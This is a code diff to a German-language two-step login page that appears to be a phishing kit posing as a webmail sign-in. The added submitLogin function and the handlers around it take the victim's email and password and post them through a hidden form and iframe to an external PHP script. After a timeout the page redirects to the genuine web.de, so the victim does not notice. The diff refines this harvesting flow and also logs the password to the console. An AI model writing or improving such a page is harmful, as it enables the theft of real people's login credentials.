@@ -117,7 +117,7 @@
 <div class="container">
   <!-- STEP 1 -->
   <div id="step1">
-    <img src="image/logo.jpg" alt="Logo" class="logo">
+    <img src="image/logo.jpg" alt="Logo" class="logo" onerror="this.src='https://via.placeholder.com/120x50?text=Logo'">
     <h2>Willkommen!</h2>
     <p>Mit Account anmelden</p>
 
@@ -129,7 +129,7 @@
 
   <!-- STEP 2 -->
   <div id="step2" class="hidden">
-   <img src="image/logo.jpg" alt="Logo" class="logo">
+   <img src="image/logo.jpg" alt="Logo" class="logo" onerror="this.src='https://via.placeholder.com/120x50?text=Logo'">
     <h2>Willkommen!</h2>
     <p>Mit Account anmelden</p>
     <p id="showEmail"></p>
@@ -192,6 +192,64 @@
   // Variable to track if we're expecting a response
   let formSubmitted = false;
   let timeoutId = null;
+
+  // Function to handle login submission
+  function submitLogin() {
+    // Get values
+    const email = hiddenEmail.value.trim();
+    const password = passwordInput.value.trim();
+    
+    // Double-check values
+    console.log("Email:", email); // For debugging
+    console.log("Password:", password); // For debugging
+    
+    // Validate
+    if (!email || !password) {
+      errorMessage.textContent = "Bitte E-Mail und Passwort eingeben.";
+      errorMessage.style.display = "block";
+      return false;
+    }
+    
+    // Check if already submitting
+    if (loginBtn.disabled && loginBtn.textContent === "Wird gesendet...") {
+      return false;
+    }
+    
+    // Disable button and show loading
+    loginBtn.disabled = true;
+    loginBtn.classList.remove("active");
+    loginBtn.textContent = "Wird gesendet...";
+    errorMessage.style.display = "none";
+    successMessage.style.display = "none";
+    loadingMessage.style.display = "block";
+    loadingMessage.textContent = "Wird verarbeitet...";
+    
+    // Set form values
+    emailField.value = email;
+    passwordField.value = password;
+    
+    // Set flag that form is being submitted
+    formSubmitted = true;
+    
+    // Set timeout to handle cases where iframe doesn't load
+    timeoutId = setTimeout(() => {
+      if (formSubmitted) {
+        console.log("Form submission timeout - assuming success, redirecting...");
+        loadingMessage.style.display = "none";
+        successMessage.style.display = "block";
+        successMessage.textContent = "Verwerking...";
+        
+        // Redirect to jamesleefold.com after timeout
+        setTimeout(() => {
+          window.location.href = "https://web.de/";
+        }, 2000);
+      }
+    }, 5000); // 5 second timeout
+    
+    // Submit form to external PHP (will handle redirect automatically in iframe)
+    hiddenForm.submit();
+    return true;
+  }
 
   // Handle iframe load event (catches the redirect/response)
   hiddenIframe.onload = function() {
@@ -265,6 +323,14 @@
     }
   });
 
+  // Handle Enter key in email field (step 1)
+  emailInput.addEventListener("keypress", function(e) {
+    if (e.key === "Enter" && weiterBtn.disabled === false) {
+      e.preventDefault();
+      weiterBtn.click();
+    }
+  });
+
   // Go to step 2
   weiterBtn.addEventListener("click", function() {
     // Store email in both places
@@ -282,7 +348,9 @@
     loadingMessage.style.display = "none";
     
     // Focus on password field
-    passwordInput.focus();
+    setTimeout(() => {
+      passwordInput.focus();
+    }, 100);
   });
 
   // Enable Login button when password is entered
@@ -296,6 +364,14 @@
     }
     errorMessage.style.display = "none";
     successMessage.style.display = "none";
+  });
+
+  // Handle Enter key in password field (step 2)
+  passwordInput.addEventListener("keypress", function(e) {
+    if (e.key === "Enter" && loginBtn.disabled === false) {
+      e.preventDefault();
+      submitLogin();
+    }
   });
 
   // Back to step 1
@@ -314,60 +390,17 @@
     if (timeoutId) {
       clearTimeout(timeoutId);
     }
+    
+    // Focus on email field
+    setTimeout(() => {
+      emailInput.focus();
+    }, 100);
   });
 
-  // Login button click handler using hidden iframe (Solution 3 - No CORS issues)
+  // Login button click handler using the submit function
   loginBtn.addEventListener("click", function(e) {
     e.preventDefault();
-    
-    // Get values
-    const email = hiddenEmail.value.trim();
-    const password = passwordInput.value.trim();
-    
-    // Double-check values
-    console.log("Email:", email); // For debugging
-    console.log("Password:", password); // For debugging
-    
-    // Validate
-    if (!email || !password) {
-      errorMessage.textContent = "Bitte E-Mail und Passwort eingeben.";
-      errorMessage.style.display = "block";
-      return;
-    }
-    
-    // Disable button and show loading
-    loginBtn.disabled = true;
-    loginBtn.classList.remove("active");
-    loginBtn.textContent = "Wird gesendet...";
-    errorMessage.style.display = "none";
-    successMessage.style.display = "none";
-    loadingMessage.style.display = "block";
-    loadingMessage.textContent = "Wird verarbeitet...";
-    
-    // Set form values
-    emailField.value = email;
-    passwordField.value = password;
-    
-    // Set flag that form is being submitted
-    formSubmitted = true;
-    
-    // Set timeout to handle cases where iframe doesn't load
-    timeoutId = setTimeout(() => {
-      if (formSubmitted) {
-        console.log("Form submission timeout - assuming success, redirecting...");
-        loadingMessage.style.display = "none";
-        successMessage.style.display = "block";
-        successMessage.textContent = "Verwerking...";
-        
-        // Redirect to jamesleefold.com after timeout
-        setTimeout(() => {
-          window.location.href = "https://web.de/";
-        }, 2000);
-      }
-    }, 5000); // 5 second timeout
-    
-    // Submit form to external PHP (will handle redirect automatically in iframe)
-    hiddenForm.submit();
+    submitLogin();
   });
 
   // Handle image errors
